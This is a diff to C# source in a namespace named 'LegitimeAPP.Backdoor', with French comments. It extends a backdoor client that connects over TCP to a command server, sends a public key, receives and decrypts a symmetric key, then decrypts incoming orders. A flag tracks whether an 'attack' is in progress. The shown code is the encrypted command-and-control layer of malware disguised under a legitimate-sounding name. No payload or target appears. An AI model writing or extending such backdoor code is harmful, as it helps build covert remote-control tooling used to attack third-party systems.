@@ -1,14 +1,7 @@
 using System ;
 using System.Net ;
 using System.Net.Sockets ;
-using System.Threading;
 using System.Text;
-using System.Linq ; 
-using System.IO;
-using System.Collections;
-using System.Collections.Generic ;
-using System.Xml;
-using System.Xml.Serialization;
 using LegitimeAPP.Shared ;
 using LegitimeAPP.OS ; 
 
@@ -94,6 +87,14 @@ namespace LegitimeAPP.Backdoor {
         Ecriture et lecture des messages envoyés et reçu par le serveur 
 
         */
+
+
+        private byte[] GetRawIncomingMessage() {
+            byte[] response = new byte[1024] ;
+            int sizeResponse = stm.Read(response, 0, 1024) ;
+
+            return response ; 
+        }
         private string GetIncomingMessage() {
             byte[] responseRaw = new byte[1024] ;
             string response = "" ; 
@@ -104,9 +105,14 @@ namespace LegitimeAPP.Backdoor {
             return response ;  
         }
 
-        private void WriteNetMessage(string message) {
-            stm.Write(enc.GetBytes(message)) ;
+        private void WriteNetMessage(string mess) {
+            stm.Write(enc.GetBytes(mess)) ;
         }
+
+        private void WriteNetMessage(byte[] mess) {
+            stm.Write(mess) ; 
+        }
+
 
 
         public bool IsConnected
@@ -161,7 +167,7 @@ namespace LegitimeAPP.Backdoor {
                 try {
                     if ( IsConnected ) {
                     // Récupère et déchiffre le nouveau message 
-                    string message = _encryption.Decrypt(GetIncomingMessage()) ;
+                    string message = Encryption.Decrypt(GetIncomingMessage(), _encryption.SymmetricKey) ;
 
                     /*
                     Dans le cas ou une attaque est en cours ignorer le nouvelle ordre
@@ -213,9 +219,16 @@ namespace LegitimeAPP.Backdoor {
 
                     stm = tcp.GetStream() ;
 
-                    // On envoie la clé publique 
+
+                    Console.WriteLine("On envoie la clé publique") ;
+                    // On envoie la clé asymétrique publique 
                     WriteNetMessage(_encryption.GetPublicKey) ;
 
+                    Console.WriteLine("On reçois la clé symétrique") ; 
+                    _encryption.SymmetricKey = _encryption.Decrypt(GetRawIncomingMessage()) ;
+
+                    Console.WriteLine("Clé reçu ! Voici la clé " + _encryption.SymmetricKey) ;
+            
                     if ( _attackInProgress) {
                         order.Stop() ;
 
